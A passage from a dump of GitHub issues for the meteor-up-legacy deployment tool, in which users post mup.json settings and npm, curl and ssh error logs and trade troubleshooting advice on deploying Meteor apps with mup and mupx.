taralgadash start/running, process 27004
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Please post your settings file too.
I always recommend using the development branch mupx if having problems with plain old regular mup.
I suspect you need to set the node version to 0.10.40 as its the one that works with Meteor 1.2
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>Sorry, mup.json is

 "servers": [
    4     {
    5       "host": "10.1.24.2",
    6       "username": "root",
    7       // "password": ""
    8       // or pem file (ssh based authentication)
    9       "pem": "/var/root/.ssh/id_dsa"
   10     }
   11   ],
   12
   13   // Install MongoDB in the server, does not destroy local MongoDB on future setup
   14   "setupMongo": false,
   15
   16   // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
~  17   "setupNode": false,
   18
   19   // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
   20   "nodeVersion": "0.10.36",
   21
   22   // Install PhantomJS in the server
~  23   "setupPhantom": false,
   24
   25   // Show a progress bar during the upload of the bundle to the server.
   26   // Might cause an error in some rare cases if set to true, for instance in Shippable CI
   27   "enableUploadProgressBar": true,
   28
   29   // Application name (No spaces)
   30   "appName": "taralgadash",
   31
   32   // Location of app (local directory)
   33   "app": "/Users/peternunn/Documents/src/hardsoftware_infolite/meteor/twfdashboard",
   34
   35   // Configure environment
   36   "env": {
   37     "ROOT_URL": "https://taralga.hardsoftware.com",
   38     "PORT": 3080,
   39     "MONGO_URL": "mongodb://localhost:27017/infolite/"
   40   },
   41
   42   // Meteor Up checks if the app comes online just after the deployment
   43   // before mup checks that, it will wait for no. of seconds configured below
   44   "deployCheckWaitTime": 350
   45 }

I'm not using 1.2, I'm still on 1.1.0.3 due to some issues (still unresolved) when we tried to migrate to 1.2.

I don't want to use mupx because I don't want to set up docker containers (I think that's what mupx does?) as I'm already using lxc containers for this project.

I've tried to run this manually by copying the bundled code into the right place but am getting 
Error: /opt/taralgadash/app/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node: invalid ELF header

when I run node main.js

I've tried removing and installing fibers@1.0.5 (globally) but its telling me I have unmet dependency somewhere... sigh.

Thanks.

Peter.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>All I can think of to try in your complicated setup is the nodejs version. Maybe 0.10.40 will help there too. I hope your solution is simpler then the typical route which is rebuilding with mupx, docker and meteor 1.2. Unofficially your no longer supported if you can call it that.
I didn't grasp your reasons why, but I'd also spend some more time to make sure trying mupx is truely not an option. 
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>Thanks MasterJames, Just wondering what's complicated about the setup?  I've used exactly the same setup (infact an exact copy of this machine) on two other installs with some minor problems last time getting the deployment happening, but its basically just a single server with meteor and mongo on it. Its an app at 1.1 rather than 1.2 but I'm not sure how that qualifies as complicated.
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>I've just cleared the directory in /opt on the server away and done a mup setup, mup deploy. Now I'm back to npm errors !! This is nuts.
 Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
registry.npmjs.org/fibers/-/fibers-1.0.5.tgz
npm ERR! fetch failed https://registry.npmjs.org/source-map/-/source-map-0.1.32.tgz
npm ERR! fetch failed https://registry.npmjs.org/source-map/-/source-map-0.1.32.tgz
npm ERR! fetch failed https://registry.npmjs.org/source-map/-/source-map-0.1.32.tgz
npm ERR! network read ECONNRESET
npm ERR! network This is most likely not a problem with npm itself
npm ERR! network and is related to network connectivity.
npm ERR! network In most cases you are behind a proxy or have bad network settings.
npm ERR! network
npm ERR! network If you are behind a proxy, please make sure that the
npm ERR! network 'proxy' config is set properly.  See: 'npm help config'

npm ERR! System Linux 3.13.0-74-generic
npm ERR! command "/usr/bin/node" "/usr/bin/npm" "install"
npm ERR! cwd /opt/taralgadash/tmp/bundle/programs/server
npm ERR! node -v v0.10.36
npm ERR! npm -v 1.4.28
npm ERR! syscall read
npm ERR! code ECONNRESET
npm ERR! errno ECONNRESET
npm ERR! not ok code 0
-----------------------------------STDOUT-----------------------------------
 &gt; ./bcrypt: npm install due to binary npm modules
bindings@1.0.0 node_modules/bindings

nodeunit@0.9.1 node_modules/nodeunit
&#9492;&#9472;&#9472; tap@0.7.1 (inherits@2.0.1, buffer-equal@0.0.2, slide@1.1.6, deep-equal@1.0.1, yamlish@0.0.7, mkdirp@0.5.1, nopt@3.0.6, difflet@0.2.6, glob@4.5.3, runforcover@0.0.2)
make: Entering directory `/opt/taralgadash/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'
  CXX(target) Release/obj.target/bcrypt_lib/src/blowfish.o
  CXX(target) Release/obj.target/bcrypt_lib/src/bcrypt.o
  CXX(target) Release/obj.target/bcrypt_lib/src/bcrypt_node.o
  SOLINK_MODULE(target) Release/obj.target/bcrypt_lib.node
  COPY Release/bcrypt_lib.node
make: Leaving directory `/opt/taralgadash/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

&gt; fibers@1.0.5 install /opt/taralgadash/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>AMAZING!! I just, in desperation ran deploy again and its started... no idea why!! This is going to bite me again I'm sure. Thanks for the help though.  Peter.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>That error you posted speaks of temporary networking problems while fetching from the registry. Anyway I'm glad it's working now.
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>There seems to be a real issue with registry.npmjs.org. If I wget a file from it, it can take 6 or more attempts before one works without a connection reset in header error.

I also just noticed that when mup fails it is still using https:// despite me setting the registry config item on the target server to http:// I'm running npm config set registry http://registry.npmjs.org as a normal user, then forcing a cache clear, is that correct or should I be running this somewhere else (on the bundling server perhaps?).
</Body>
    </Comment>
    <Comment>
      <Owner>pnunn</Owner>
      <Body>OK, on another machine I'm having the same issue. It seems mup deploy is ignoring the registry setting no matter if I set it on the target or the development machine. Where the hell do I need to set this to make it stick?

Worked it out.. missed the -g flag when I set the value. My /etc/npmrc file is now

registry=https://skimdb.npmjs.com/registry
 fetch-retries=10

So, using the mirror registry, and it seems to be OK.
</Body>
    </Comment>
  </Issue_169>
  <Issue_170>
    <Repository>meteor-up-legacy</Repository>
    <Title>JFYI - Error: spawn meteor ENOENT - how did i fix this on linux</Title>
    <Owner>arunoda</Owner>
    <Body>I am using Linux + nvm 0.29 + node 5.4.0 + meteor 1.2.1 + mupx 1.5.3

I have error on `mupx deploy`:

```
Meteor app path    : /mnt/ssd/home-fast/coder/work/ip/grant
Using buildOptions : {"debug":true}
events.js:141
      throw er; // Unhandled 'error' event
      ^

Error: spawn meteor ENOENT
    at exports._errnoException (util.js:856:11)
    at Process.ChildProcess._handle.onexit (internal/child_process.js:178:32)
    at onErrorNT (internal/child_process.js:344:16)
    at nextTickCallbackWith2Args (node.js:478:9)
    at process._tickCallback (node.js:392:17)
    at Function.Module.runMain (module.js:432:11)
    at startup (node.js:141:18)
    at node.js:1003:3
```

After short investigation i found that...
node environment does not love:
1. symlinks
2. tildas `~` in path

I had:
1. symlinked ~/.nvm
2. ~/.meteor in my PATH

I replaced symlinks with actual dir/files and fixed path in ~/.bashrc

```
export PATH="$PATH:$HOME/.meteor"
```

I can run `mupx deploy` now )))

I hope it will be useful )
## Summary
1. don't use symlinks
2. don't use `~` in path
</Body>
    <State>open</State>
    <Comment>
      <Owner>laran</Owner>
      <Body>This was good to see. It gave me something new to try. But I don't have either symlinks or tildas in my path and I'm still seeing the error. It has me dead in the water. Writing my own deploy script because I can't get off the ground with mup right now. Would love to see this issue resolved.
</Body>
    </Comment>
  </Issue_170>
  <Issue_171>
    <Repository>meteor-up-legacy</Repository>
    <Title>502 Bad Gateway on redeploy</Title>
    <Owner>arunoda</Owner>
    <Body>(Cross posting this from the cluster package in case any mup folks have any ideas.)  

I have multiple instances running using the cluster package, with Route 53 as DNS and no balancers. I have multiple Route 53 entries, each with the same hostname, that each point to the IP address of a different instance. This setup works well once deployed. But when I do a redeploy using mupx deploy, a connected client disconnects from the server (as expected) but then refreshes to a 502 Bad Gateway error page. Has anyone else run into this -- any ideas on how to work around?
</Body>
    <State>open</State>
    <Comment>
      <Owner>macroramesh6</Owner>
      <Body>at the time of redeploy. the existing docker destroyed and new docker will be created. @arunoda should be fix
</Body>
    </Comment>
  </Issue_171>
  <Issue_172>
    <Repository>meteor-up-legacy</Repository>
    <Title> All configured authentication methods failed</Title>
    <Owner>arunoda</Owner>
    <Body>I follow this tuto http://meteortips.com/deployment-tutorial/digitalocean-part-1/, but for some reason I still getting an Authentication Error. I'm running Windows 8.1 on my computer.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It's a bit dated. I say use the development branch mupx instead of plain old mup.
Now with Meteor 1.2+ you must use 0.10.40 for the node version.
Only Ubuntu 14 as the deployment target is supported.
If you are having any error after all that you should post your settings file and one full debug level output from the logs, along with any other info you think might help as you have. (Your hosting provider, Operation Systems etc.)
You can also try extending the wait time to 120 instead of 15 seconds and possibly try a larger target image (a system with more RAM).
</Body>
    </Comment>
  </Issue_172>
  <Issue_173>
    <Repository>meteor-up-legacy</Repository>
    <Title>TLS 1.1+ Support in MupX</Title>
    <Owner>arunoda</Owner>
    <Body>How do I get TLS 1.1+ support for MupX? I see it's not possible with MUP. We have a healthcare application that requires HIPPA compliance and we must use TLS 1.1+ according to the NIST 800 specs.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Here is a link about TLS on nginx.
http://askubuntu.com/questions/319192/how-to-enable-tls-1-2-in-nginx
Mupx which is the best current available version uses nginx so that would require customizing the configuration file used (deeply hidden in multiple docker dependencies) in the Mupx package (you'll probably have to make a PR and use it for yourself or wait a few months to see how the new version currently bring ported to karidahq handles it).
The real problem with that idea is it loads docker images from elsewhere and even that route does not provide complete access so you'll find yourself running into similar problems you've already experienced.
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh#L58
You basically need to replace the front-end stuff.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe Meteor's Galaxy is the right solution for you? 
</Body>
    </Comment>
    <Comment>
      <Owner>terenceng2010</Owner>
      <Body>@MasterJames Does it mean that by default mupx currently only support TLS 1.0 only? From https://github.com/meteorhacks/mup-frontend-server/blob/master/lib/nginx.conf I can see the line `ssl_protocols TLSv1 TLSv1.1 TLSv1.2;` though ?
</Body>
    </Comment>
    <Comment>
      <Owner>codeHatcher</Owner>
      <Body>@MasterJames when we get one of these to scale we will definitely be using Galaxy but if we can't get the first version out and meet the required HIPAA compliance we won't be able to :(
</Body>
    </Comment>
    <Comment>
      <Owner>terenceng2010</Owner>
      <Body>@codeHatcher For the old mup, maybe you can try to disable stud and than install bud-tls manually?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think you're right. It should work with mupx as you pointed to the TLS 1.2 ref. You also asked the right person in that other thread. I'm no expert at this just trying to help and learn.
If you deploy with mupx what is telling you its not supported? 
Here is a way to check it.
http://serverfault.com/questions/638691/how-can-i-verify-if-tls-1-2-is-supported-on-a-remote-web-server-from-the-rhel-ce 
(Or Google similar.)
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Galaxy people will help you answer this question on their end if you ask the right person nicely. I'm sure you could try for 30 days (or maybe more if needed?) without the expense.
</Body>
    </Comment>
  </Issue_173>
  <Issue_174>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mup Deploy: Invoking FAILED</Title>
    <Owner>arunoda</Owner>
    <Body>I am new to mup. I am trying to deploy my app to a Digitalocean server (2GB RAM).

I have tried everything I could find online and still no success, please help.

//MUP.JSON
"servers": [
    {
      "host": "198.199.100.226",
      "username": "root",
      // "password": "password"
      // or pem file (ssh based authentication)
      "pem": "~/.ssh/id_rsa"
    }
  ],

  "setupMongo": true,

  "setupNode": true,

  "nodeVersion": "0.10.40",

  "setupPhantom": true,

  "enableUploadProgressBar": true,

  "appName": "chaselwarner",

  "app": ".",

  "env": {
    "ROOT_URL": "http://198.199.100.226"
  },

  "deployCheckWaitTime": 120
## }

// ERROR LOG
Building Started: .

Started TaskList: Deploy app 'chaselwarner' (linux)
[198.199.100.226] - Uploading bundle
[198.199.100.226] - Uploading bundle: SUCCESS
[198.199.100.226] - Setting up Environment Variables
[198.199.100.226] - Setting up Environment Variables: SUCCESS
[198.199.100.226] - Invoking deployment process
[198.199.100.226] x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------

```
&gt; fibers@1.0.1 install /opt/chaselwarner/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
underscore@1.5.2 node_modules/underscore

eachline@2.3.3 node_modules/eachline
&#9492;&#9472;&#9472; type-of@2.0.1

semver@4.1.0 node_modules/semver

chalk@0.5.1 node_modules/chalk
&#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9500;&#9472;&#9472; escape-string-regexp@1.0.4
&#9500;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
&#9492;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)

source-map-support@0.2.8 node_modules/source-map-support
&#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

fibers@1.0.1 node_modules/fibers
Waiting for MongoDB to initialize. (5 minutes)
connected
chaselwarner stop/waiting
chaselwarner start/running, process 2400
Waiting for 120 seconds while app is booting up
Checking is app booted or not?
chaselwarner stop/waiting
chaselwarner start/running, process 2931
----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe try with a password and not pem first? 
Second thought is that of a firewall blocking the curl test that it's running. At amazon they use words like "ingress".
To test that would mean SSHing into the target deployment machine and running something on the port and test if you can access internally but not externally then it's blocked or in general a routing issue.
</Body>
    </Comment>
    <Comment>
      <Owner>roddle</Owner>
      <Body> I have a similar problem, but my deployment failed on bcrypt. I'm using a new installation of ubuntu on DigitalOcean: 14.04.3 LTS (GNU/Linux 3.13.0-71-generic x86_64)
 mup setup worked fine, but mup deploy failed in a similar fashion to chaselwarner. I don't have a firewall set up and I am using password authentication:

$ mup setup

## Meteor Up: Production Quality Meteor Deployments

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Started TaskList: Setup (linux)
[45.55.18.113] - Installing Node.js
[45.55.18.113] - Installing Node.js: SUCCESS
[45.55.18.113] - Installing PhantomJS
[45.55.18.113] - Installing PhantomJS: SUCCESS
[45.55.18.113] - Setting up Environment
[45.55.18.113] - Setting up Environment: SUCCESS
[45.55.18.113] - Copying MongoDB configuration
[45.55.18.113] - Copying MongoDB configuration: SUCCESS
[45.55.18.113] - Installing MongoDB
[45.55.18.113] - Installing MongoDB: SUCCESS
[45.55.18.113] - Configuring upstart
[45.55.18.113] - Configuring upstart: SUCCESS

$ mup deploy

## Meteor Up: Production Quality Meteor Deployments

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Building Started: /Users/Toddio/meteor/calinet/

Started TaskList: Deploy app 'slack1' (linux)
[45.55.18.113] - Uploading bundle
[45.55.18.113] - Uploading bundle: SUCCESS
[45.55.18.113] - Setting up Environment Variables
[45.55.18.113] - Setting up Environment Variables: SUCCESS
[45.55.18.113] - Invoking deployment process
[45.55.18.113] x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
n args   '-Dnode_lib_file=node.lib',
gyp info spawn args   '-Dmodule_root_dir=/opt/slack1/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
gyp info spawn args   '--depth=.',
gyp info spawn args   '--no-parallel',
gyp info spawn args   '--generator-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok 
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
stop: Unknown instance: 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    App did not pick up! Please check app logs.
    -----------------------------------STDOUT-----------------------------------
    s
    &gt; node ./build.js

```
`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
ansi-regex@0.2.1 node_modules/ansi-regex

ansi-styles@1.1.0 node_modules/ansi-styles

escape-string-regexp@1.0.3 node_modules/escape-string-regexp

chalk@0.5.1 node_modules/chalk

strip-ansi@0.3.0 node_modules/strip-ansi

has-ansi@0.1.0 node_modules/has-ansi

supports-color@0.2.0 node_modules/supports-color

eachline@2.3.3 node_modules/eachline

type-of@2.0.1 node_modules/type-of

amdefine@1.0.0 node_modules/amdefine

asap@2.0.3 node_modules/asap

underscore@1.5.2 node_modules/underscore

meteor-promise@0.5.0 node_modules/meteor-promise

promise@7.0.4 node_modules/promise

source-map-support@0.3.2 node_modules/source-map-support

semver@4.1.0 node_modules/semver

source-map@0.1.32 node_modules/source-map

fibers@1.0.5 node_modules/fibers
Waiting for MongoDB to initialize. (5 minutes)
connected
slack1 start/running, process 11444
Waiting for 30 seconds while app is booting up
Checking is app booted or not?
----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It's well known here. It's only an issue since Meteor 1.2 became available.
The project is getting rebuild for kadirahq so those changes/updates (with PRs) which should have been immediate will never be used but won't be a problem in the new version, which is still a few months off.
</Body>
    </Comment>
    <Comment>
      <Owner>vincro</Owner>
      <Body>We are now at 1.3 and probelm remains. Are there any clear and direct solutions for anyone who uses accounts-password or similar?
</Body>
    </Comment>
  </Issue_174>
  <Issue_175>
    <Repository>meteor-up-legacy</Repository>
    <Title>Redirect https naked-domain to www in meteor</Title>
    <Owner>arunoda</Owner>
    <Body>how can I redirect client https://example.com to https://www.example.com (also ROOT_URL) in meteor?

I tried with Route 53 &amp; S3 for redirecting but these worked when https is not enabled.

I used mupx to deploy the app on digital ocean. Is there anyway I achieve the same thing on nginx (I guess it is used by mupx).
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You'll most likely need to change your nginx settings once deployed or possible change what gets deployed but I think more manually.
The settings seems well explained here.
http://stackoverflow.com/questions/7947030/nginx-no-www-to-www-and-www-to-no-www

I've gone over how one might dig around in mupx and try to manually add changes here that might also be helpful in resolving your plight.
https://github.com/arunoda/meteor-up/issues/661
</Body>
    </Comment>
    <Comment>
      <Owner>ashishapy</Owner>
      <Body>Thanks @MasterJames . I tried many thing (including suggestion by you) but somehow not able to get it working :( 4 days &amp; still counting.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Ya I guess it's not a feature yet.
It seems like maybe it would take longer then you can to figure it out.
After another deeper look it would probably be this file you need to change.
https://github.com/meteorhacks/mup-frontend-server/blob/master/lib/nginx.conf

Alternatively you could find another way.
Www is not so important, is it?
</Body>
    </Comment>
    <Comment>
      <Owner>ashishapy</Owner>
      <Body>Yeah, we decide not to give more importance to www now :)
</Body>
    </Comment>
    <Comment>
      <Owner>v3rron</Owner>
      <Body>You can just add force-ssl and canonical packages:
https://atmospherejs.com/wizonesolutions/canonical
https://atmospherejs.com/meteor/force-ssl
this will always force your domain access to `https://www.*`
</Body>
    </Comment>
  </Issue_175>
  <Issue_176>
    <Repository>meteor-up-legacy</Repository>
    <Title>Uses triple equals when comparing code</Title>
    <Owner>arunoda</Owner>
    <Body>I noticed this when looking at `lib/build.js`. It is a tiny improvement and I know there is work being done to dockerize mup so this PR may never see the light of day!
</Body>
    <State>open</State>
    <Comment>
      <Owner>tosbourn</Owner>
      <Body>@arunoda should I kill this PR or is there something I can do to get it merged</Body>
    </Comment>
  </Issue_176>
  <Issue_177>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to upgrade node version on previously deployed server?</Title>
    <Owner>arunoda</Owner>
    <Body>Mup has previously been used to deploy a project with node 0.10.36. With the new version of Meteor, the node requirement is now 0.10.40 or later. How can we upgrade node on the existing server, so that our application can be updated with recent changes?
# Solution
1. Edit mup.json
2. Change the node version to the desired value (e.g. 0.10.40, or x.x.40)
3. run `mup setup` - this will install the updated version
4. run `mup deploy` - this should be able to successfully deploy Meteor 1.2.x + applications
</Body>
    <State>open</State>
    <Comment>
      <Owner>brylie</Owner>
      <Body>For reference, I found the answer to my own question. I am posting them both here so other people may find the same answer.
</Body>
    </Comment>
  </Issue_177>
  <Issue_178>
    <Repository>meteor-up-legacy</Repository>
    <Title>Fixed an issue in the env.sh template for linux</Title>
    <Owner>arunoda</Owner>
    <Body>- there were spurious spaces in front of the exports that caused an
  error for me (surprised noone else reported that yet).
</Body>
    <State>open</State>
    <Comment>
      <Owner>nickboucart</Owner>
      <Body>Saved my day! Had an issue deploying, applying this patch locally fixed my issues.
</Body>
    </Comment>
  </Issue_178>
  <Issue_179>
    <Repository>meteor-up-legacy</Repository>
    <Title>Please add option for smallfiles</Title>
    <Owner>arunoda</Owner>
    <Body>The journal file really gets out of control, it would be great if mupx had an option to set `smallfiles` to `true` to avoid smaller disks running out of space.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think one can hack those settings in...
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/mongodb.conf
I think I left that or similar set in my now aging Pull Request for mupx.
There are various ways to change that. Other then a pull request of your own. One is editing the file where npm installs it, or on the server after.
I'll finish by saying +1 to that and the 30+ potential improvements lost in PR limbo.
</Body>
    </Comment>
    <Comment>
      <Owner>ffxsam</Owner>
      <Body>Right, you can modify the mongodb.conf file but that gets overwritten every time you deploy. I'll plan on doing a PR to add this option to mup.json.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Yes thanks.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>@MasterJames we are moving mup into Kadira these days. See: https://github.com/kadirahq/meteor-up

Idea of this to speed up the mup development and get community contributions a lot faster. This will have essential tests and so on. We can port existing mupx features in two weeks. Then we can add features faster.

I'll do a blog post next week or after that.
Thank you all.
</Body>
    </Comment>
    <Comment>
      <Owner>ffxsam</Owner>
      <Body>I'll be sure to do the PR there. Thanks Arunoda!
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Oh good to hear thanks for noting that.
As a final note changing the npm installed version will survive re-deployments unless npm install mupx is part of a dockerfile or build script etc.
</Body>
    </Comment>
  </Issue_179>
  <Issue_180>
    <Repository>meteor-up-legacy</Repository>
    <Title>Timed out while waiting for handshake</Title>
    <Owner>arunoda</Owner>
    <Body>events.js:141
      throw er; // Unhandled 'error' event
      ^

Error: Timed out while waiting for handshake
    at null._onTimeout (/usr/local/lib/node_modules/mupx/node_modules/ssh2/lib/client.js:138:17)
    at Timer.listOnTimeout (timers.js:92:15)

I'm getting this error. How to fix this?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Hopefully someone else knows this problem but until then I'll make a few suggestions.
That error is coming from deep inside a 3rd party library for ssh2. You should post all your settings files and full DEBUG log.
Otherwise you could double check your SSH is working properly. 
Also it seems like it could be an intermittent networking problem.
It would also be useful to run updates and check installed versions and your target image is Ubuntu 14. 
</Body>
    </Comment>
    <Comment>
      <Owner>ghost</Owner>
      <Body>@MasterJames Thanks for replying man, I can't access my server right now (down probably) so maybe that's the reason for the error. I'm using google cloud and the UI suddenly changed and some pop up saying that I should sign up for trial when going over the platform. I can't even see my instances, just the numbers of instances running then that pop up..
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Might be the pem setup too. Maybe try with just password and no pem initially after confirming your hosting target account is setup etc.
</Body>
    </Comment>
    <Comment>
      <Owner>krtrice</Owner>
      <Body>I'm having the exact same issue and error message.. My computer recently had the hard drive wiped and a fresh OS installed. I installed meteor, npm and mup all fresh and now cannot admin my server at all with mup. I'm able to SSH manually into the server without any issues.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Sounds like you should try mupx if your using mup? 
</Body>
    </Comment>
  </Issue_180>
  <Issue_181>
    <Repository>meteor-up-legacy</Repository>
    <Title>Up to date version of Node for Meteor</Title>
    <Owner>arunoda</Owner>
    <Body>I had errors deploying because now Meteor fails with words: "Meteor requires Node v0.10.40 or later"
</Body>
    <State>open</State>
    <Comment>
      <Owner>tosbourn</Owner>
      <Body>@SergioB I would suggest combining this PR with #782 and #783 since they all appear to be doing the same sort of thing.
</Body>
    </Comment>
  </Issue_181>
  <Issue_182>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploying with no port</Title>
    <Owner>arunoda</Owner>
    <Body>I'm using an nginx reverse proxy (https://hub.docker.com/r/jwilder/nginx-proxy/) to manage routing,

So I don't need to setup specific port access though mupx seems to default to port 80, which is conflicting with the reverse proxy.

Any setting to remove that default? Or should I fork?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>```
// Also, for non-standard ssh port use this 
      //"sshOptions": { "port" : 49154 }, 
```

There is an example where these are commented out under 'server'. Is that what your looking for? 
You would not include ssl section which deploys the customizable nginx for you I believe.
</Body>
    </Comment>
  </Issue_182>
  <Issue_183>
    <Repository>meteor-up-legacy</Repository>
    <Title>Failed to Deploy</Title>
    <Owner>arunoda</Owner>
    <Body>After trying to make it work for a full day, I almost given up now.
I virtually tried everything from what  I found by googling, but nothing worked!

This is what I am getting:
45.55.1.143] &#10008; Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
Warning: Permanently added '45.55.1.143' (ECDSA) to the list of known hosts.
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
stop: Unknown instance: 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------

```
&gt; fibers@1.0.5 install /opt/portal/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
fibers@1.0.5 node_modules/fibers
portal start/running, process 6575
Waiting for MongoDB to initialize. (5 minutes)
connected
Waiting for 15 seconds while app is booting up
Checking is app booted or not?
portal stop/waiting
portal start/running, process 6645
----------------------------------------------------------------------------
```

Completed TaskList: Deploy app 'portal'

If you can help to figure out what is wrong and fix it, it would be greatly appreciated. 
Thank you!
</Body>
    <State>open</State>
    <Comment>
      <Owner>innocube</Owner>
      <Body>And this is mup log:

45.55.1.143] Warning: Permanently added '45.55.1.143' (ECDSA) to the list of known hosts.
[45.55.1.143] tail: [45.55.1.143] cannot open &#8216;300&#8217; for reading[45.55.1.143] : No such file or directory
[45.55.1.143] ==&gt; /var/log/upstart/portal.log &lt;==
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.&lt;anonymous&gt; (/opt/portal/app/programs/server/boot.js:5:9)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17)
error: Forever detected script exited with code: 8
[45.55.1.143] error: Script restart attempt #1216
[45.55.1.143] 
[45.55.1.143] module.js:340
[45.55.1.143]     throw err;[45.55.1.143] 
[45.55.1.143]  [45.55.1.143]  [45.55.1.143]  [45.55.1.143]        ^
Error: Cannot find module 'underscore'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.&lt;anonymous&gt; (/opt/portal/app/programs/server/boot.js:5:9)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17)
error: Forever detected script exited with code: 8
[45.55.1.143] error: Script restart attempt #1217[45.55.1.143] 

module.js:340
    throw err;
   [45.55.1.143]        ^
Error: Cannot find module 'underscore'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.&lt;anonymous&gt; (/opt/portal/app/programs/server/boot.js:5:9)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
[45.55.1.143]     at Function.Module._load (module.js:312:12)
